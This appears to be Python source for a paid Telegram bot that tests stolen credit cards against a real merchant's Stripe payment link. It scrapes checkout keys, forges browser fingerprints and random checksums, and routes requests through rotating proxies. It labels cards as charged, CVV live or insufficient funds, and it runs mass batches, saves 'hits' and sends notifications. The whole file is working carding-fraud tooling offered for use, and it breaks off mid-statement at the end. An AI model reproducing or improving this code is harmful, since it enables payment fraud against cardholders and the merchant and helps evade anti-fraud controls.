def _rand_id_stripe(k=32):
    """Generate random ID"""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def _rand_hex_stripe(k=64):
    """Generate random hex"""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def parse_from_buy_page_stripe(html):
    """Parse publishable key and checkout session ID from buy page"""
    key = None
    m = re.search(r"pk_live_[A-Za-z0-9]+", html)
    if m:
        key = m.group(0)
    cs_id = None
    m = re.search(r"cs_live_[A-Za-z0-9]+", html)
    if m:
        cs_id = m.group(0)
    return key, cs_id


async def get_stripe_session_data() -> Dict:
    """Get Stripe session data (cookies, session ID, etc.)"""
    
    session_data = {
        "session": None,
        "cookies": {},
        "checkout_session_id": None,
        "pk_live": None,
        "config_id": None,
        "line_item_id": None,
        "expected_amount": 100,
        "currency": "aud",
        "muid": None,
        "guid": None,
        "sid": None,
        "stripe_mid": None,
        "stripe_sid": None
    }
    
    try:
        # Step 1: Get the buy page
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": generate_user_agent(),
        }
        
        async with httpx.AsyncClient(timeout=30.0, verify=False, follow_redirects=True) as client:
            response = await client.get(STRIPE_BUY_URL, headers=headers)
            html = response.text
            
            # Save cookies
            for cookie in response.cookies.jar._cookies.values():
                for c in cookie.values():
                    if c.name == "__stripe_mid":
                        session_data["stripe_mid"] = c.value
                    elif c.name == "__stripe_sid":
                        session_data["stripe_sid"] = c.value
            
            # Generate fingerprint
            session_data["muid"] = str(uuid.uuid4())
            session_data["guid"] = str(uuid.uuid4())
            session_data["sid"] = str(uuid.uuid4())
            
            # Parse keys from HTML
            pk_live, cs_id = parse_from_buy_page_stripe(html)
            session_data["pk_live"] = pk_live or "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
            session_data["checkout_session_id"] = cs_id
            
            # Step 2: Get payment link data
            merchant_headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://buy.stripe.com",
                "referer": "https://buy.stripe.com/",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": generate_user_agent(),
            }
            
            payment_link_form = {
                "eid": "NA",
                "browser_locale": "en",
                "browser_timezone": "Asia/Saigon",
                "referrer_origin": "https://karibuwomenhome.com.au",
            }
            
            pl_resp = await client.post(
                f"https://merchant-ui-api.stripe.com/payment-links/{STRIPE_PAYMENT_LINK_ID}",
                headers=merchant_headers,
                data=urllib.parse.urlencode(payment_link_form)
            )
            
            if pl_resp.status_code == 200:
                pl_data = pl_resp.json()
                session_data["checkout_session_id"] = pl_data.get("session_id") or session_data["checkout_session_id"]
                session_data["config_id"] = pl_data.get("config_id")
                session_data["currency"] = pl_data.get("currency") or "aud"
                
                lig = pl_data.get("line_item_group") or {}
                expected = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if expected is not None:
                    session_data["expected_amount"] = int(expected)
                
                items = lig.get("line_items") or []
                if items:
                    session_data["line_item_id"] = items[0].get("id")
            
            # Step 3: Get elements session
            api_headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": generate_user_agent(),
            }
            
            stripe_js_id = str(uuid.uuid4())
            
            elements_params = {
                "client_betas[0]": "google_pay_beta_1",
                "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
                "client_betas[2]": "blocked_card_brands_beta_2",
                "deferred_intent[mode]": "payment",
                "deferred_intent[amount]": str(session_data["expected_amount"]),
                "deferred_intent[currency]": session_data["currency"],
                "deferred_intent[payment_method_types][0]": "card",
                "deferred_intent[payment_method_types][1]": "link",
                "deferred_intent[capture_method]": "automatic_async",
                "currency": session_data["currency"],
                "key": session_data["pk_live"],
                "elements_init_source": "payment_link",
                "hosted_surface": "checkout",
                "referrer_host": "buy.stripe.com",
                "stripe_js_id": stripe_js_id,
                "locale": "en",
                "type": "deferred_intent",
                "checkout_session_id": session_data["checkout_session_id"],
            }
            
            es_resp = await client.get(
                "https://api.stripe.com/v1/elements/sessions",
                params=elements_params,
                headers=api_headers
            )
            
            if es_resp.status_code == 200:
                es_data = es_resp.json()
                if not session_data["config_id"]:
                    session_data["config_id"] = es_data.get("config_id")
                
                # Get line item ID if not found
                if not session_data["line_item_id"]:
                    if "displayed_line_item_groups" in es_data and es_data["displayed_line_item_groups"]:
                        items = es_data["displayed_line_item_groups"][0].get("line_items") or []
                        if items:
                            session_data["line_item_id"] = items[0].get("id")
                    elif "line_items" in es_data and es_data["line_items"]:
                        session_data["line_item_id"] = es_data["line_items"][0].get("id")
            
            session_data["stripe_js_id"] = stripe_js_id
            session_data["session"] = client
            
            print(f"✅ Stripe session initialized")
            print(f"   Checkout Session: {session_data['checkout_session_id']}")
            print(f"   Amount: {session_data['expected_amount']} {session_data['currency'].upper()}")
            
            return session_data
            
    except Exception as e:
        print(f"❌ Error getting Stripe session: {e}")
        return session_data


async def check_card_stripe_pl(card: str, proxy: str = None, user_id: int = None) -> Dict:
    """
    Check card using Stripe Payment Link gateway
    """
    print(f"\n{'='*80}")
    print(f"💳 [STRIPE PAYMENT LINK] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "$0.00",
        "gateway": "Stripe Payment Link"
    }
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        cc, mm, yy, cvv = parts
        
        # Format year
        if len(yy) == 4:
            yy = yy[2:]
        
        # Setup proxy
        proxy_url = format_proxy(proxy) if proxy else None
        
        start_time = time.time()
        
        # Get Stripe session data
        session_data = await get_stripe_session_data()
        
        if not session_data.get("checkout_session_id"):
            return {
                "status": "error",
                "result": "SESSION_FAILED",
                "message": "Failed to initialize Stripe session",
                "status_display": "⚠️ SESSION ERROR",
                "status_category": "error",
                "elapsed": time.time() - start_time
            }
        
        # Prepare API headers
        buy_headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com",
            "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": generate_user_agent(),
        }
        
        # Generate name and email
        first_name = random.choice(["John", "Mike", "David", "James", "Robert", "William"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"])
        card_name = f"{first_name} {last_name}"
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 999)}@gmail.com"
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(45.0, connect=15.0, read=35.0),
            verify=False,
            proxy=proxy_url,
            follow_redirects=True
        ) as client:
            
            # Step 1: Create payment method
            print(f"📡 [STEP 1] Creating payment method...")
            
            form_pm = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "billing_details[name]": card_name,
                "billing_details[email]": email,
                "billing_details[address][country]": "US",
                "guid": session_data.get("guid", str(uuid.uuid4())),
                "muid": session_data.get("muid", str(uuid.uuid4())),
                "sid": session_data.get("sid", str(uuid.uuid4())),
                "key": session_data["pk_live"],
                "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
                "client_attribution_metadata[client_session_id]": session_data.get("stripe_js_id", str(uuid.uuid4())),
                "client_attribution_metadata[checkout_session_id]": session_data["checkout_session_id"],
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "payment_link",
                "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                "client_attribution_metadata[checkout_config_id]": session_data.get("config_id", ""),
            }
            
            pm_response = await client.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=buy_headers,
                data=urllib.parse.urlencode(form_pm)
            )
            
            pm_data = pm_response.json()
            pm_id = pm_data.get("id")
            
            if pm_data.get("error"):
                error_msg = pm_data["error"].get("message", "Unknown error")
                error_code = pm_data["error"].get("code", "")
                
                # Check for insufficient funds
                if "insufficient" in error_msg.lower():
                    return {
                        "status": "success",
                        "result": "INSUFFICIENT_FUNDS",
                        "message": "Card has insufficient funds",
                        "status_display": "💰 INSUFFICIENT FUNDS",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for CVV error
                elif "cvv" in error_msg.lower() or "security" in error_msg.lower():
                    return {
                        "status": "success",
                        "result": "CVV_LIVE",
                        "message": f"CVV verification failed: {error_msg}",
                        "status_display": "✅ CVV LIVE",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for 3D secure
                elif "3d" in error_msg.lower() or "secure" in error_msg.lower():
                    return {
                        "status": "success",
                        "result": "3D_REQUIRED",
                        "message": f"3D Secure required: {error_msg}",
                        "status_display": "🔐 3D REQUIRED",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for card declined
                elif "declined" in error_msg.lower():
                    return {
                        "status": "declined",
                        "result": "DECLINED",
                        "message": error_msg,
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": time.time() - start_time,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                else:
                    return {
                        "status": "error",
                        "result": "PM_CREATION_FAILED",
                        "message": error_msg,
                        "status_display": "⚠️ ERROR",
                        "status_category": "error",
                        "elapsed": time.time() - start_time,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
            
            if not pm_id:
                return {
                    "status": "error",
                    "result": "NO_PM_ID",
                    "message": "Failed to create payment method",
                    "status_display": "⚠️ ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            print(f"✅ Payment method created: {pm_id}")
            
            # Step 2: Confirm payment
            print(f"🔥 [STEP 2] Confirming payment...")
            
            init_checksum = _rand_id_stripe(32)
            js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
            pxvid = str(uuid.uuid4())
            rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))
            
            confirm_form = {
                "eid": "NA",
                "payment_method": pm_id,
                "expected_amount": str(session_data["expected_amount"]),
                "last_displayed_line_item_group_details[subtotal]": str(session_data["expected_amount"]),
                "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
                "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
                "last_displayed_line_item_group_details[total_discount_amount]": "0",
                "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
                "expected_payment_method_type": "card",
                "guid": session_data.get("guid", str(uuid.uuid4())),
                "muid": session_data.get("muid", str(uuid.uuid4())),
                "sid": session_data.get("sid", str(uuid.uuid4())),
                "key": session_data["pk_live"],
                "version": "148043f9d7",
                "init_checksum": init_checksum,
                "js_checksum": js_checksum,
                "pxvid": pxvid,
                "passive_captcha_token": "",
                "passive_captcha_ekey": "",
                "rv_timestamp": rv_timestamp,
                "client_attribution_metadata[client_session_id]": session_data.get("stripe_js_id", str(uuid.uuid4())),
                "client_attribution_metadata[checkout_session_id]": session_data["checkout_session_id"],
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "payment_link",
                "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                "client_attribution_metadata[checkout_config_id]": session_data.get("config_id", ""),
            }
            
            confirm_response = await client.post(
                f"https://api.stripe.com/v1/payment_pages/{session_data['checkout_session_id']}/confirm",
                headers=buy_headers,
                data=urllib.parse.urlencode(confirm_form, safe="")
            )
            
            elapsed = time.time() - start_time
            confirm_data = confirm_response.json()
            
            # Check for error
            err = confirm_data.get("error") or {}
            if err:
                code = err.get("code")
                decline_code = err.get("decline_code")
                message = err.get("message")
                
                print(f"📥 Response: code={code}, decline_code={decline_code}, message={message}")
                
                # Check for insufficient funds
                if "insufficient" in str(message).lower():
                    return {
                        "status": "success",
                        "result": "INSUFFICIENT_FUNDS",
                        "message": "Card has insufficient funds",
                        "status_display": "💰 INSUFFICIENT FUNDS",
                        "status_category": "approved",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for CVV error
                elif "cvv" in str(message).lower() or "security" in str(message).lower():
                    return {
                        "status": "success",
                        "result": "CVV_LIVE",
                        "message": f"CVV verification failed: {message}",
                        "status_display": "✅ CVV LIVE",
                        "status_category": "approved",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for 3D secure
                elif "3d" in str(message).lower() or "secure" in str(message).lower():
                    return {
                        "status": "success",
                        "result": "3D_REQUIRED",
                        "message": f"3D Secure required: {message}",
                        "status_display": "🔐 3D REQUIRED",
                        "status_category": "approved",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                # Check for card declined
                elif "declined" in str(message).lower():
                    return {
                        "status": "declined",
                        "result": "DECLINED",
                        "message": message,
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                else:
                    return {
                        "status": "declined",
                        "result": "DECLINED",
                        "message": message or "Payment declined",
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
            
            # Check if payment was successful
            if confirm_response.status_code == 200 and isinstance(confirm_data.get("id"), str):
                if confirm_data["id"].startswith("ppage_"):
                    return {
                        "status": "success",
                        "result": "3DS_REQUIRED",
                        "message": "3D Secure required - Authentication needed",
                        "status_display": "🔐 3D REQUIRED",
                        "status_category": "approved",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link"
                    }
                else:
                    return {
                        "status": "success",
                        "result": "CHARGED",
                        "message": "Payment successful - Card charged",
                        "status_display": "🔥 CHARGED 🔥",
                        "status_category": "charged",
                        "elapsed": elapsed,
                        "price": f"${session_data['expected_amount']/100:.2f}",
                        "gateway": "Stripe Payment Link",
                        "payment_id": confirm_data.get("id")
                    }
            
            return {
                "status": "declined",
                "result": "DECLINED",
                "message": "Payment declined",
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": f"${session_data['expected_amount']/100:.2f}",
                "gateway": "Stripe Payment Link"
            }
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        default_result["message"] = str(e)[:100]
        return default_result


def format_stripe_pl_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Stripe Payment Link response for display with Premium emojis"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Stripe Payment Link")
    price = result.get("price", "$0.00")
    
    # Parse card for display
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Clean message
    clean_message = message[:80]
    
    # Format country with flag
    country_name = country.replace('🌐', '').strip()
    flag_map = {
        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪', 'MALAYSIA': '🇲🇾'
    }
    country_flag = "🌍"
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Determine premium emoji based on status
    if status_category == "charged":
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_text = "CHARGED"
    elif status_category == "approved":
        if "3D" in message or "3d" in message.lower():
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
            status_text = "3D REQUIRED"
        elif "INSUFFICIENT" in message.upper():
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
            status_text = "INSUFFICIENT FUNDS"
        else:
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            status_text = "CVV LIVE"
    else:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_text = "DECLINED"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_text}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌬ 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
        f"⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"⌬ 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
        f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category





# ============ STRIPE PL SINGLE CHECK ============
async def single_check_stripe_pl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Stripe Payment Link - /ct <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Stripe Payment Link Gateway</b>\n\n"
            "Usage: <code>/ct &lt;card&gt;</code>\n"
            "Example: <code>/ct 4111111111111111|12|2028|123</code>\n\n"
            "💰 Amount: Variable (from payment link)\n"
            "📍 Gateway: Stripe via Payment Link\n"
            "✅ Checks: Charged, 3DS, CVV Live, Insufficient Funds",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2028|123"
        )
        return
    
    # Check credits
    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    # Check gateway access
    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
            
        )
        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
        add_user_credits(u_id, 1)
        return
    
    stripe_pl_active_tasks[user_id] = True
    
    try:
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Stripe Payment Link...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if user_manager.can_use_proxy(user_id):
            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                if proxy_list:
                    proxy_index = random.randint(0, len(proxy_list) - 1)
                    proxy_str = proxy_list[proxy_index]
        
        result = await check_card_stripe_pl(card, proxy_str, user_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        ui, status_category = format_stripe_pl_response(result, card, bin_info)
        await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        if status_category in ["charged", "approved"]:
            await save_hit_to_file(
                card=card, gateway="Stripe Payment Link",
                response=result.get("message", "Approved"),
                price=result.get("price", "$0.00"),
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            if status_category == "charged":
                user_data = user_manager.get_user(user_id)
                await send_hit_notification(
                    context=context, gateway="Stripe Payment Link", card=card,
                    response=result.get("message", "Charged"),
                    price=result.get("price", "$0.00"),
                    user=user_data, bin_info=bin_info, status_category="charged"
                )
                user_manager.increment_hits(user_id)
        
        user_manager.increment_checks(user_id)
        
        if user_manager.get_tier(user_id) == 'free':
            remaining = get_user_credits(user_id)
            await message.reply_text(
                f"💎 <b>Credits Remaining: {remaining}</b>\n"
                f"Use /credits to check balance.",
                parse_mode=ParseMode.HTML
            )
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        add_user_credits(user_id, 1)
    finally:
        stripe_pl_active_tasks.pop(user_id, None)


# ============ STRIPE PL MASS CHECK ============
async def stripe_pl_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for Stripe Payment Link gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [STRIPE PL MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    stats = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    
    try:
        stripe_pl_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        
        CONCURRENCY = {
            "free": 1,
            "premium": 2,
            "ultimate": 5,
            "admin": 5,
        }.get(tier, 2)
        
        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
        
        if progress_msg is None:
            progress_text = (
                f"<b>Gateway</b> ➛ Stripe Payment Link\n"
                f"<b>Status</b> ➛ STARTING...\n"
                f"<b>Checked</b> ➛ 0/{total}\n"
                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
                f"<b>Time</b> ➛ 0s"
            )
            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
        
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        stats_lock = asyncio.Lock()
        processed_count = 0
        
        async def update_progress(current: int):
            if current > 0 and current < total and current % 10 != 0:
                return
            elapsed = int(time.time() - start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            if current >= total:
                status_text = "FINISHED ✅"
            else:
                status_text = f"PROCESSING {current}/{total}"
            
            progress_text = (
                f"<b>Gateway</b> ➛ Stripe Payment Link\n"
                f"<b>Status</b> ➛ {status_text}\n"
                f"<b>Checked</b> ➛ {current}/{total}\n"
                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
                f"<b>Time</b> ➛ {time_str}"
            )
            try:
                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except Exception as e:
                if "message is not modified" not in str(e).lower():
                    print(f"⚠️ Progress update error: {e}")
        
        async def process_single_card(card: str, idx: int):
            nonlocal processed_count
            
            await asyncio.sleep(random.uniform(0.1, 0.3))
            
            async with semaphore:
                await speed_controller.wait_if_needed()
                start = time.time()
                
                # Get proxy if allowed
                proxy_str = None
                if user_manager.can_use_proxy(u_id):
                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
                        proxy_list = autosopi_proxy_tracker.working_proxies[u_id]
                        if proxy_list:
                            proxy_index = idx % len(proxy_list)
                            proxy_str = proxy_list[proxy_index]
                
                result = await check_card_stripe_pl(card, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                bin_info = await get_bin_info(card)
                
                response_msg = result.get("message", "")
                status_category = result.get("status_category", "unknown")
                
                async with stats_lock:
                    processed_count += 1
                    
                    if status_category == "charged":
                        stats["charged"] += 1
                        stats["approved"] += 1
                        print(f"🔥 [CHARGED] {card[:20]}...")
                    elif status_category == "approved":
                        stats["approved"] += 1
                        print(f"✅ [APPROVED] {card[:20]}...")
                    elif status_category == "declined":
                        stats["declined"] += 1
                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
                    else:
                        stats["errors"] += 1
                        print(f"⚠️ [ERROR] {card[:20]}...")
                    
                    if processed_count % 10 == 0 or processed_count == total:
                        await update_progress(processed_count)
                
                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
                if status_category in ["charged", "approved"]:
                    ui, _ = format_stripe_pl_response(result, card, bin_info)
                    try:
                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
                        print(f"📤 [SENT] {card[:20]}...")
                    except Exception as e:
                        print(f"❌ Error sending result: {e}")
                    
                    await save_hit_to_file(
                        card=card, gateway="Stripe Payment Link",
                        response=response_msg,
                        price=result.get("price", "$0.00"),
                        bin_info=bin_info, user_id=u_id, user_tier=tier
                    )
                    
                    if status_category == "charged":
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context, gateway="Stripe Payment Link", card=card,
                            response=response_msg,
                            price=result.get("price", "$0.00"),
                            user=user_data, bin_info=bin_info, status_category="charged"
                        )
                        user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in stripe_pl_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    stats["errors"] += 1
        
        if u_id in stripe_pl_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Stripe Payment Link Mass Check Complete</b>\n\n"
                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
                f"{approved_emoji} <b>Approved/3DS</b> ➛ {stats['approved']}\n"
                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
                f"📝 <b>Total</b> ➛ {total}\n"
                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
